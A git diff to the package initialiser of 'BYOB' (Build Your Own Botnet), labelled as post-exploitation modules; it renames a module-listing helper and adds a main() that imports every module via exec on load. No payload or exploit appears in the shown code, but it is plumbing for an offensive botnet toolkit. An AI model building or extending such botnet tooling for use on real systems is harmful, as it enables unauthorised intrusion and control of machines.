@@ -1,6 +1,6 @@
 #!/usr/bin/python
 # -*- coding: utf-8 -*-
-""" 
+"""Post-Exploitation Modules (Build Your Own Botnet)
 
 88                                  88
 88                                  88
@@ -129,22 +129,17 @@ byob.modules
 
 """
 
-def __get_root__():
-    import os
-    root = os.getcwd()
-    if root.count('byob'):
-        return os.sep.join(root.split(os.sep)[:root.split(os.sep).index('byob') + 1] + ['byob'])
-    else:
-        for cwd, dirs, files in os.path.walk('/'):
-            if cwd.count('byob'):
-                return os.sep.join(cwd.split(os.sep)[:cwd.split(os.sep).index('byob') + 1] + ['byob'])
-
-def __get_all__():
+def __get_all():
     import os
     return [os.path.splitext(i)[0] for i in os.listdir(os.path.abspath(__name__.replace('.', os.sep))) if '__init__.py' not in i]
 
-__all__ 	= __get_all__()
+def main():
+    for module in __all__:
+        exec "import {}".format(module)
+
+__all__ 	= __get_all()
 __version__     = '0.1.5'
 __license__     = 'GPLv3'
 __author__      = 'Daniel Vega-Myhre'
 __github__      = 'https://github.com/colental/byob'
+main()
